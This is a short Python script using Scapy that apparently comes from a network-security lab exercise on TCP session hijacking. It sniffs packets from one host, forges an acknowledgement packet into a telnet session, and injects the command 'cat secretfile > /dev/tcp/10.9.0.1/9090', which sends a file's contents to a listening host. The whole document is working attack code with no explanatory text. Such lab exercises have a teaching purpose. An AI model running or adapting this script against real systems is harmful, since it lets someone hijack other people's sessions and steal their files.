#!/usr/bin/env python3
from scapy.all import *

def sniff_n_spoof(pkt):
	ip  = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=23, flags="A", seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
	data = ("\r cat secretfile > /dev/tcp/10.9.0.1/9090 \r")
	pkt = ip/tcp/data
	send(pkt,iface='br-74481477aa6b', verbose=0)

pkt = sniff(iface='br-74481477aa6b', filter='tcp and src host 10.9.0.5', prn=sniff_n_spoof)
